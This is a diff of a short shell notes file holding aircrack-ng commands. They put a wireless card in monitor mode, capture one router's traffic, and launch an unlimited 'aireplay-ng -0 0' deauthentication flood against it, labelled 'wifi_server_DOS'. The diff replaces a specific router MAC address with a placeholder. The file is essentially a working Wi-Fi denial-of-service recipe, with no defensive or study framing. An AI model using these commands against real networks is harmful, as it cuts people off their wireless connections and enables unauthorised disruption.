@@ -14,13 +14,14 @@ ifconfig wlo1 up
 airmon-ng check wlo1
 
 
-//(kill NetworkManager  >>  then dhclient  >> then all others)
+<(kill NetworkManager  >>  then dhclient  >> then all others)>
 
 
-airodump-ng -c 6 -w SCAN_test1 --bssid 34:E9:11:92:FD:33 wlo1
+airodump-ng -c 6 -w SCAN_test1 --bssid <mac_address_of_router> wlo1
 
 
-aireplay-ng -0 0 -a 34:E9:11:92:FD:33 wlo1
+aireplay-ng -0 0 -a <mac_address_of_router> wlo1
 
 
+# wifi_server_DOS
 # wifi_server_DOS
